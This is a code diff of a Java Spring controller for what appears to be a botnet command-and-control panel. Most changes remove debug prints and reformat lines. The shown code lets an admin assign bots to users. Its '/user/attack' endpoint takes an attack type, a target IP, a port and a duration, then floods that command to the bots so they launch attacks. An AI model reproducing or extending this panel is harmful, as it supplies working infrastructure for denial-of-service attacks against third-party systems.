@@ -67,7 +67,6 @@ public class SiteController {
 	 * @return
 	 * @throws IOException
 	 */
-	// @PreAuthorize("hasRole('ROLE_ANONYMOUS')")
 	@RequestMapping(value = "/login", method = RequestMethod.GET)
 	public String login(HttpServletResponse error, HttpServletResponse httpServletResponse) throws IOException {
 		String result = "";
@@ -80,12 +79,10 @@ public class SiteController {
 				for (GrantedAuthority gA : x) {
 					System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
 					if (gA.toString().contains("ROLE_ADMIN")) {
-						System.out.println("admin ");
 
 						result = "redirect:/site/admin/index";
 					}
 					if (gA.toString().contains("ROLE_USER")) {
-						System.out.println("no admin");
 						result = "redirect:/site/user/index";
 					}
 				}
@@ -124,8 +121,7 @@ public class SiteController {
 	 * @throws IOException
 	 */
 	@RequestMapping(value = "/logout", method = RequestMethod.GET)
-	public String logoutPage(HttpServletRequest request, HttpServletResponse response, HttpServletResponse error)
-			throws IOException {
+	public String logoutPage(HttpServletRequest request, HttpServletResponse response, HttpServletResponse error) throws IOException {
 		String result = "";
 		if (configEngine.isCommandandconquerStatus()) {
 			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
@@ -182,18 +178,14 @@ public class SiteController {
 			}
 		model.addAttribute("bots", botList);
 		model.addAttribute("users", uServ.findAll());
-		System.out.println("linkFinisgh");
 		return "addbot";
 	}
 
 	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.POST)
 	public ModelAndView addBot(@ModelAttribute("linkBot") LinkBot lb) {
-		System.out.println(" m utente " + lb.getIdUsrL());
-		System.out.println(" m bot " + lb.getIdBotL());
 		Bot bot = bServ.searchBotID(lb.getIdBotL());
 		User usr = uServ.findById(lb.getIdUsrL());
 		bot.setBotUser(usr);
-		System.out.println("bot " + bot.getIp() + " " + bot.getIdBot() + " " + bot.getBotUser() == null);
 		bServ.updateBot(bot);
 		String cmd = "setbot<BU>" + usr.getSsoId() + "<BU>" + bot.getIdBot();
 		cmm.floodingByCecToBot(cmd, usr.getSsoId());
@@ -205,19 +197,14 @@ public class SiteController {
 	 */
 	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.GET)
 	public String removeBot(ModelMap model) {
-		System.out.println("linkstart");
 		model.addAttribute("usr", new User());
 		model.addAttribute("users", uServ.findAll());
-		System.out.println("linkFinisgh");
 
 		return "deletebot";
 	}
 
 	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.POST)
 	public ModelAndView removeBot(@ModelAttribute("usr") User usr) {
-		System.out.println("linkstart2");
-
-		System.out.println(" m utente " + usr.getEmail());
 		usr = uServ.findById(usr.getId());
 		List<Bot> botList = bServ.findAll();
 		List<Bot> botList2 = new ArrayList<Bot>();
@@ -271,8 +258,7 @@ public class SiteController {
 
 			uServ.save(user);
 
-			model.addAttribute("success",
-					"User " + user.getFirstName() + " " + user.getLastName() + " registered successfully");
+			model.addAttribute("success", "User " + user.getFirstName() + " " + user.getLastName() + " registered successfully");
 			model.addAttribute("loggedinuser", getPrincipal());
 			return "registration";
 		}
@@ -313,16 +299,12 @@ public class SiteController {
 	}
 
 	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.POST)
-	public ModelAndView choseAttack(@ModelAttribute("target") Target target, HttpServletResponse error)
-			throws IOException {
+	public ModelAndView choseAttack(@ModelAttribute("target") Target target, HttpServletResponse error) throws IOException {
 		if (configEngine.isCommandandconquerStatus()) {
-			System.out.println("stampo roba " + target.getTypeAttack() + " " + target.getIpDest() + " "
-					+ target.getPortDest() + " " + target.getTimeToAttack());
 			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
 			String idUser = auth.getName();
 			System.out.println("Utente che sta iniziando un attacco " + idUser);
-			String cmd = target.getTypeAttack() + "<TT>" + target.getIpDest() + "<TT>" + target.getPortDest() + "<TT>"
-					+ target.getTimeToAttack() + "<TT>" + idUser;
+			String cmd = target.getTypeAttack() + "<TT>" + target.getIpDest() + "<TT>" + target.getPortDest() + "<TT>" + target.getTimeToAttack() + "<TT>" + idUser;
 			cmm.floodingByUser(cmd, idUser);
 			return new ModelAndView("redirect:/site/user/attack");
 		} else {
@@ -330,6 +312,5 @@ public class SiteController {
 			return null;
 		}
 	}
-
 
 }
